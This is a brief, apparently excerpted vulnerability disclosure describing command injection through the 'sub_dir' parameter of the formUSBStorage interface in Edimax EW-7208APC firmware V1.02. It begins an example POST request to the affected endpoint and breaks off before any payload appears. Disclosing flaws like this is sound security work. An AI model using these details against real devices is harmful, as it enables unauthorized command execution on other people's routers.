...
A command injection vulnerability was discovered in the Edimax EW-7208APC firmware version ​**V1.02**. The vulnerability arises from the improper input validation of the `'sub_dir'` parameter in the 'formUSBStorage' interface of the file webs.
...
Using ghidra we known that the vulnerability code in function 'formUSBStorage' is below:
![vulner_code.png](./img/vulner_code.png)
- ​**websGetVar** retrieves POST parameters 'sub_dir'.
...
Example package
```http
POST /goform/formUSBStorage HTTP/1.1  
Host: 192.168.2.1  
